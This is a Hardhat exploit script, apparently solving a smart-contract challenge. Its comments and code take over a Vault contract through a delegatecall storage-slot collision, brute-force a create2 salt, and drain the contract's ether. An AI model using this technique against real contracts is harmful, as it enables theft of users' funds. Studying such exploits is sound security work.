const hre = require("hardhat");
const { ethers } = hre;

const address = '0xBBCf8b480F974Fa45ADc09F102496eDC38cb3a6C';

// The main vulnerability here is a storage layout incompatibility between the Vault contract
// and the Vesting contract (Vault delegatecalls to Vesting). The Vault contract holds the
// `owner` variable in the second storage slot, while the Vesting contract contains the
// `duration` variable at this slot.
// We can modify the `duration` variable using the `setDuration` function (only increase
// its value), this will actually modify the `owner` variable. The delegatecall has an
// authentication guard that requires to be called from the the owner of the Vault contract
// or the contract itself, however there's an `execute` function we can use which will run an
// arbitrary call. We can use this function to call the contract itself with the `setDuration`
// data, effectively bypassing the authentication.
// Once we are owners of the contract, we can modify the delegate to a new contract we control
// and implement a function to withdraw the ether.
// One caveat from this approach is that we need to make sure that, when we are overwriting
// the owner using `setDuration`, the new address is actually "greater" than the current
// owner of the contract, else `setDuration` will fail. If you are lucky your address
// already covers this condition. If not you can try generating more addresses, use a vanity
// address generator or use `create2` to deploy a contract with a precomputed address.
// `create2` allows us to precompute the contract deployment address, meaning we can try with
// different salt values until we get an address that matches the condition.
// Steps:
// 1. Brute force a value for the salt that will make our attack contract address greater
//    then the current owner of the contract (function `findSalt` in this script).
//    Deploy the HackVault using this salt, attack continues in the `hack` function of this
//    contract.
// 2. Call `setDuration` with the attack contract address through the `execute` function.
// 3. Once we are owners, we can update the delegate address in the Vault contract. Here we are
//    using the same attack contract that implements the `withdraw` function that will allow us
//    to remove the funds.
// 4. Once the delegate is in place, we can simply call `withdraw` to steal the funds through the
//    `execute` function (or as a direct call since we are owners now).
async function main() {
  const [signer] = await ethers.getSigners();

  const Vault = await ethers.getContractFactory("Vault");
  const vault = Vault.attach(address);

  const currentOwner = await vault.owner();
  console.log('Current Vault owner:', currentOwner);

  const VaultHackCreator = await ethers.getContractFactory("VaultHackCreator", signer);
  const hackCreator = await VaultHackCreator.deploy();
  await hackCreator.deployed();

  const salt = await findSalt(hackCreator.address, signer.address, currentOwner);
  const hackTx = await hackCreator.deploy(address, signer.address, salt);
  await hackTx.wait();

  console.log('Vault balance:', (await ethers.provider.getBalance(address)).toString());
  console.log('Done!');
}

async function findSalt(deployingAddress, signerAddress, currentOwner) {
  const HackVault = await ethers.getContractFactory("HackVault");
  const args = ethers.utils.defaultAbiCoder.encode(['address', 'address'], [address, signerAddress]);
  const contractHash = ethers.utils.solidityKeccak256(
    ['bytes', 'bytes'],
    [HackVault.bytecode, args],
  );

  let salt = 0;

  while(true) {
    const paddedSalt = ethers.utils.hexZeroPad('0x' + salt.toString(16), 32);

    let predictedAddress = ethers.utils.solidityKeccak256(
      ['bytes1', 'address', 'bytes32', 'bytes32'],
      ['0xff', deployingAddress, paddedSalt, contractHash],
    );
    predictedAddress = '0x' + predictedAddress.slice(26);

    if (ethers.BigNumber.from(predictedAddress).gt(ethers.BigNumber.from(currentOwner))) {
      console.log('Found salt:', salt);
      console.log('Predicted address:', predictedAddress);
      return salt;
    }

    salt += 1;
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
